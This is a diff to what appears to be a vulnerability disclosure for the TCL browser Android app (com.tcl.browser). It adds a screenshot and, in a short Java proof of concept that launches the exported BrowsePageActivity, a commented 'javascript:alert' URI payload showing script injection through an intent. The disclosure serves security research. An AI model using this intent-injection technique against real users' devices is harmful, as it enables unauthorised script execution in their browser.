@@ -23,6 +23,9 @@ This vulnerability is particularly concerning because:
 - The victim does not need to grant any special permissions to any installed applications.
 - The attack can be initiated remotely without user interaction.
 
+![image](https://github.com/actuator/com.tcl.browser/assets/78701239/530526e3-1ce9-4342-8906-728fcdc6cb0f)
+
+
 ### Proof of Concept (PoC):
 
 To demonstrate the vulnerability, one can create a simple Android app that invokes the exported `BrowsePageActivity` activity.
@@ -47,6 +50,7 @@ public class MainActivity extends AppCompatActivity {
 
         // Set the URL data you want to pass (for example "http://www.example.com")
         intent.setData(Uri.parse("http://www.example.com"));
+        // OR intent.setData(Uri.parse("javascript:alert('...');"));
 
         // Start the activity
         startActivity(intent);
